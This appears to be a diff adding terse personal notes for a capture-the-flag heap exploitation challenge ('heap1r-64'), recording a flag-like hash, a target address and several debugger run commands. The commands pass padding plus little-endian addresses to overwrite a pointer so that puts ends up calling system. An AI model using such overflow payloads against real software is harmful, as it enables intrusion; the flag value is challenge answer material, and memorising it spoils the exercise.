@@ -1,0 +1,16 @@
+65bb4d6bf152d38018c31fac2da3e7c6
+0x400745
+flag
+
+r "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ\x20\x10\x60\x00"`" "`/bin/echo -ne "BBBB"`"
+
+r "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ\x20\x10\x60\x00"`" "`/bin/echo -ne "\x45\x07\x40\x00"`"
+
+
+
+Call system on puts
+trys to execute command: and
+r "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ\x20\x10\x60\x00"`" "`/bin/echo -ne "\xc6\x04\x40"`"
+
+
+/problems/heap1r-64_0_29fe9183f6faf53d3ee17ac0c1f2d1a6
